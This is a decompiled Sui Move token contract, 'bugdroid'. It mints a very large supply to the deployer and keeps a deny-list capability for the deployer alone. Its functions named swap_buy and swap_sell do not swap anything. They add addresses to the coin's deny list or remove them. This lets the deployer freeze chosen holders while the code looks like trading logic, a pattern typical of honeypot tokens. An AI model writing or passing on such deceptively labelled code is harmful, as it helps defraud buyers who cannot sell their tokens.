module 0xb2ee08284c414bec90daf9bde10ff6cd43c65c77fb16d9cabfb9e38ad1355474::bugdroid {
    struct BUGDROID has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: BUGDROID, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BUGDROID>(arg0, 9, b"bugdroid", b"bugdroid", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmUn6swNJUGyt1yUWJuXbZKXfhMo6vJ1gHyQnYi9C7AW9f"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<BUGDROID>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BUGDROID>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BUGDROID>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BUGDROID>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BUGDROID>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BUGDROID>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BUGDROID>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<BUGDROID>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

